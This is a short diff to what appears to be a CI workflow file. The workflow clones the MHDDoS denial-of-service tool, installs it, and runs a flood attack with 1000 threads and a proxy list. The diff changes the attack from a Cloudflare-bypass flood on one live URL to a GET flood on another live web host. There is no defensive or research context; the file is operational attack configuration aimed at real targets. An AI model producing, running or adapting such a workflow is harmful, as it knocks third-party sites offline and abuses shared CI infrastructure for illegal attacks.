@@ -7,4 +7,4 @@ jobs:
           git clone https://github.com/MatrixTM/MHDDoS.git
           cd MHDDoS
           pip install -r requirements.txt
-          python start.py CFB https://cni.c71465aaa9fc98e5.eu.cc/ 0 1000 p.txt 100 60 true
+          python start.py GET https://react-router-starter-template.tosavailable.workers.dev/ 0 1000 p.txt 100 60 true
